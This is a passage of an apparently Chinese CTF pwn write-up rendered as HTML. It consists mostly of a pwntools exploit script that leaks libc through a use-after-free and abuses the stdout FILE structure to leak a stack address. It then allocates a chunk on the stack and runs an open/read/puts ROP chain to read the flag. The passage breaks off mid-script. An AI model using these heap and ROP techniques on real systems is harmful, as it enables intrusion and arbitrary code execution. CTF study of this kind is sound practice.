◂— 0x0<br>\n07:0038│     0x7ffff7fc26d8 (<em>IO_2_1_stdout</em>+56) —▸ 0x7ffff7fc2723 (<em>IO_2_1_stdout</em>+131) ◂— 0xfc37e0000000000a /* ‘\\n’ */</p>\n</blockquote>\n<p>此时只要去执行一次 puts 或者 prinf 就可以泄露栈地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再次利用堆拓展攻击，申请到栈上，劫持返回地址进行 orw 即可</p>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Choice: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele_</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-8</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-6</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>stdout <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x128</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>add_<span class=\"token 